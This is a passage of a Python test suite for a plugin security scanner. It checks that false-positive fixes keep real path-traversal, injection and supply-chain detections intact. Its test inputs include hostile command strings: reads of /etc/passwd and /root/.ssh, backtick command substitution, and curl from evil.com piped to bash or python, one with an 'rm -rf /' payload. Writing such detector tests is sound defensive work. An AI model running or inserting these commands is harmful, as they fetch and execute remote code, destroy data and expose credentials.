            f"/tmp/... must not fire absolute-path rule (POSIX temp). Got: {[r.message for r in tmp_findings]}"
        )

    def test_var_folders_macos_temp_is_not_critical(self, tmp_path):
        """macOS user temp at /var/folders/<hash>/T/ is a normal mktemp target."""
        content = 'echo data > /var/folders/xy/abc123/T/cache.json\n'
        report = ValidationReport()
        scan_for_path_traversal(content, "plugin/cache.sh", report)
        critical = [r for r in report.results if r.level == "CRITICAL" and "/var/" in r.message]
        assert critical == [], (
            f"/var/folders/.../T/ (macOS user temp) must not be CRITICAL. Got: {[r.message for r in critical]}"
        )

    def test_etc_passwd_still_fires(self, tmp_path):
        """The fix must NOT weaken detection: /etc/passwd reads remain CRITICAL."""
        content = 'leaked = open("/etc/passwd").read()\n'
        report = ValidationReport()
        scan_for_path_traversal(content, "plugin/leak.py", report)
        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert critical, "/etc/ paths must still trigger CRITICAL"

    def test_root_home_still_fires(self, tmp_path):
        """/root/ remains CRITICAL — root home is not a benign reference."""
        content = 'os.system("ls /root/.ssh/")\n'
        report = ValidationReport()
        scan_for_path_traversal(content, "plugin/ssh_check.py", report)
        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert critical, "/root/ paths must still trigger CRITICAL"

    # ----- backtick FP in JS/TS files -------------------------------------

    def test_backtick_in_js_comment_is_not_critical(self, tmp_path):
        """Backticks inside `// JS comments` are markdown-style code refs, not POSIX cmd-sub."""
        content = (
            "// - No `enum` (use const arrays or z.enum())\n"
            "// - No `!` / `as` in production code (relaxed in tests)\n"
            "// - Use `Result<T, E>` from neverthrow\n"
        )
        report = ValidationReport()
        scan_for_injection(content, "plugin/eslint.config.mjs", report)
        backtick_critical = [
            r for r in report.results
            if r.level == "CRITICAL" and "`...`" in r.message
        ]
        assert backtick_critical == [], (
            f"Backticks in JS/TS comments must not be CRITICAL. Got: {[r.message for r in backtick_critical]}"
        )

    def test_backtick_in_typescript_template_literal_is_not_critical(self, tmp_path):
        """ES2015 template literals use backticks — a TS source feature, not cmd-sub."""
        content = (
            "const greeting = `Hello, ${name}!`;\n"
            "const url = `https://api.example.com/users/${userId}`;\n"
        )
        report = ValidationReport()
        scan_for_injection(content, "plugin/api.ts", report)
        backtick_critical = [
            r for r in report.results
            if r.level == "CRITICAL" and "`...`" in r.message
        ]
        assert backtick_critical == [], (
            f"TS template literals must not be CRITICAL. Got: {[r.message for r in backtick_critical]}"
        )

    def test_backtick_inside_python_subprocess_call_still_fires(self, tmp_path):
        """The fix must NOT weaken detection: backticks inside subprocess.* in Python remain CRITICAL."""
        content = "subprocess.run(f'echo `id`', shell=True)\n"
        report = ValidationReport()
        scan_for_injection(content, "plugin/exec.py", report)
        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert critical, "Backticks in Python subprocess calls must still fire"

    def test_backtick_in_shell_script_still_fires(self, tmp_path):
        """Backticks in real shell scripts (.sh) remain caught by the existing shell-script logic.

        Shell scripts are skipped by the command-substitution check by design
        (substitution is expected there); the test simply confirms that change
        of behavior is unchanged by this FP fix.
        """
        # Shell scripts are intentionally skipped — the FP fix only affects JS/TS.
        # No regression possible because is_js_ts_file does not match .sh.
        # This test pins that contract.
        from validate_security import is_js_ts_file
        assert is_js_ts_file("foo.sh") is False
        assert is_js_ts_file("foo.bash") is False
        assert is_js_ts_file("eslint.config.mjs") is True
        assert is_js_ts_file("api.ts") is True

    # ----- curl-piped-to-interpreter FP for json.tool ---------------------

    def test_curl_piped_to_python_json_tool_is_not_critical(self, tmp_path):
        """`curl URL | python3 -m json.tool` is a read-only pretty-printer, not exec."""
        content = 'curl -s "${API_URL}/v1/users" | python3 -m json.tool\n'
        report = ValidationReport()
        scan_for_supply_chain(content, "plugin/api.sh", report)
        sc_critical = [
            r for r in report.results
            if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message
        ]
        assert sc_critical == [], (
            f"curl|python3 -m json.tool must not be CRITICAL. Got: {[r.message for r in sc_critical]}"
        )

    def test_curl_piped_to_python_pprint_is_not_critical(self, tmp_path):
        """`-m pprint`, `-m pydoc`, `-m base64` are read-only formatters too."""
        for mod in ("pprint", "pydoc", "base64"):
            content = f'curl https://api.example.com/data | python3 -m {mod}\n'
            report = ValidationReport()
            scan_for_supply_chain(content, "plugin/api.sh", report)
            sc = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
            assert sc == [], f"curl|python3 -m {mod} must not be CRITICAL. Got: {[r.message for r in sc]}"

    def test_curl_piped_to_node_version_is_not_critical(self, tmp_path):
        """Node interpreter mentioned without exec markers should not trigger."""
        # `node` followed by `-V` (--version short flag) is benign
        # The new regex only fires when followed by exec markers — so just
        # `| node -V` should not match.
        content = 'curl https://example.com/version | node -V\n'
        report = ValidationReport()
        scan_for_supply_chain(content, "plugin/check.sh", report)
        sc = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
        assert sc == [], f"`curl | node -V` must not be CRITICAL. Got: {[r.message for r in sc]}"

    def test_curl_piped_to_bash_still_fires(self, tmp_path):
        """The fix must NOT weaken detection: `curl ... | bash` remains the canonical install attack."""
        content = 'curl -fsSL https://evil.com/install.sh | bash\n'
        report = ValidationReport()
        scan_for_supply_chain(content, "plugin/install.sh", report)
        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
        assert critical, "`curl | bash` must still fire"

    def test_curl_piped_to_python_dash_c_still_fires(self, tmp_path):
        """`curl URL | python3 -c "code"` is exec-mode and must stay CRITICAL."""
        content = 'curl https://evil.com/payload | python3 -c "import os; os.system(\'rm -rf /\')"\n'
        report = ValidationReport()
        scan_for_supply_chain(content, "plugin/exec.sh", report)
        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
        assert critical, "`curl | python3 -c` must still fire"

    def test_curl_piped_to_python_stdin_still_fires(self, tmp_path):
        """`curl URL | python3 -` (explicit stdin) is exec-mode and must stay CRITICAL."""
        content = 'curl https://evil.com/payload.py | python3 -\n'
        report = ValidationReport()
        scan_for_supply_chain(content, "plugin/exec.sh", report)
        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
        assert critical, "`curl | python3 -` (stdin) must still fire"

    def test_curl_piped_to_python_bare_still_fires(self, tmp_path):
        """`curl URL | python3` with nothing after defaults to stdin exec — must stay CRITICAL."""
        content = 'curl https://evil.com/payload.py | python3\n'
        report = ValidationReport()
        scan_for_supply_chain(content, "plugin/exec.sh", report)
        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
        assert critical, "Bare `curl | python3` must still fire"
